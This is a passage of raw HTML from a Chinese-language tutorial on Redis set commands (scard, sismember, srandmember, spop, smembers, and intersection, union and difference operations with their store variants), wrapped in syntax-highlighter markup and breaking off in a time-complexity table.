class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nscard key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08929d001980802-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08929d001980802-1\"><span class=\"crayon-e\">scard </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/3d4caa6d2fd620822e51d7945bdfa886.png\" width=\"300\" height=\"66\"></p>\n<p>scard 命令的时间复杂度为O(1)，scard 命令不会遍历 set 中的所有元素，而是直接使用 Redis 中的内部变量。</p>\n<ul>\n<li>判读元素是否在集合中</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892a2089646139\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsismember key member</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892a2089646139-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892a2089646139-1\"><span class=\"crayon-e\">sismember </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">member</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d7e372e64f098629eab504d909277e2f.png\" width=\"419\" height=\"111\"></p>\n<p>sismember 命令也有返回值，如果返回值为1则表示当前元素在当前 set 中，如果返回 0 则表示当前元素不在 set 中。</p>\n<ul>\n<li>随机从 set 中返回指定个数元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892a5275452869\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsrandmember key [count]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892a5275452869-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892a5275452869-1\"><span class=\"crayon-e\">srandmember </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/79c76e9059061c38dbbf1e79a122abfd.png\" width=\"413\" height=\"134\"></p>\n<p>srandmember 命令中有一个可选参数 count，count 参数指的是返回元素的个数，如果当前 set 中的元素个数小于 count，则 srandmember 命令返回当前 set 中的所有元素，如果 count 参数等于 0，则不返回任何数据，如果 count 参数小于 0，则随机返回当前 count 个数的元素。</p>\n<ul>\n<li>从集合中随机弹出元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892a9650672581\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nspop key [count]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892a9650672581-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892a9650672581-1\"><span class=\"crayon-e\">spop </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/99dc4921ccae808c0fca3a287087cdf3.png\" width=\"372\" height=\"153\"></p>\n<p>spop 命令也是随机从 set 中弹出元素，并且也支持 count 可选参数，但有一点和 srandmember 命令不同。spop 命令在随机弹出元素之后，会将弹出的元素从 set 中删除。</p>\n<ul>\n<li>获取所有元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892ac924101371\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsmembers key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892ac924101371-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892ac924101371-1\"><span class=\"crayon-e\">smembers </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/4b232525b1456ecc47a4299b049c557a.png\" width=\"441\" height=\"215\"></p>\n<p>smembers 命令虽然能获取当前 set 中所有的元素，但返回元素的顺序与 sadd 添加元素的顺序不一定相同，这也就是前面提到过的保存在 set 中的元素是无序的。</p>\n<p> </p>\n<h3>2.集合间操作</h3>\n<ul>\n<li>集合的交集</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892af266210531\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsinter key [key ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892af266210531-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892af266210531-1\"><span class=\"crayon-e\">sinter </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d04d0f29a3101b001ea5ede53644737b.png\" width=\"444\" height=\"217\"></p>\n<ul>\n<li>集合的并集</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892b3103110451\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsunion key [key ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892b3103110451-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892b3103110451-1\"><span class=\"crayon-e\">sunion </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/1245c1e7becf3df6f25a94f013fdd2a2.png\" width=\"403\" height=\"216\"></p>\n<ul>\n<li>集合的差集</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892b6596201930\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsdiff key [key ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892b6596201930-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892b6596201930-1\"><span class=\"crayon-e\">sdiff </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a67781da30221ce099c9f215fc74c69a.png\" width=\"411\" height=\"149\"></p>\n<ul>\n<li>将集合的交集、并集、差集的结果保存</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892b9539203472\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsinterstore destination key [key ...]\r\nsunionstore destination key [key ...]\r\nsdiffstore destination key [key ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892b9539203472-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892b9539203472-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892b9539203472-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892b9539203472-1\"><span class=\"crayon-e\">sinterstore </span><span class=\"crayon-e\">destination </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892b9539203472-2\"><span class=\"crayon-e\">sunionstore </span><span class=\"crayon-e\">destination </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892b9539203472-3\"><span class=\"crayon-e\">sdiffstore </span><span class=\"crayon-e\">destination </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d18158a6a6db56c37ac69c6f9d968e96.png\" width=\"627\" height=\"515\"></p>\n<p>为什么 Redis 要提供 sinterstore、sunionstore、sdiffstore 命令来将集合的交集、并集、差集的结果保存起来呢？这是因为 Redis 在进行上述比较时，会比较耗费时间，所以为了提高性能可以将交集、并集、差集的结果提前保存起来，这样在需要使用时，可以直接通过 smembers 命令获取。</p>\n<p> </p>\n<h2>时间复杂度</h2>\n<p>下面我们看一下 set 中相关命令的时间复杂度。</p>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>命令</td>\n<td>时间复杂度</td>\n</tr>\n<tr>\n<td>sadd key member [member …]</td>\n<td>O(k),k是元素的个数</td>\n</tr>\n<tr>\n<td>srem key member [member 